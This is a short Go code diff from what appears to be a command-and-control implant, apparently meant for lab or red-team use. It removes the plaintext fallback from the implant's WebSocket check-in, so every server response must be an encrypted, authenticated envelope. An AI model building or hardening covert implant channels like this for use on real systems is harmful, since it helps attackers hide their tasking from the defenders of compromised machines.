@@ -84,12 +84,8 @@ func (w *wsChannel) checkin(payload map[string]any) (map[string]any, error) {
 	if err := json.Unmarshal(data, &resp); err != nil {
 		return nil, err
 	}
-	// Response may be sealed envelope
-	if _, ok := resp["c"]; ok {
-		return openEnv(w.psk, resp)
-	}
-	// plaintext fallback (lab servers without implant_require_auth)
-	return resp, nil
+	// AEAD required — same as HTTP channel (no plaintext task path)
+	return openEnv(w.psk, resp)
 }
 
 func (w *wsChannel) result(taskID, out, status string) error {
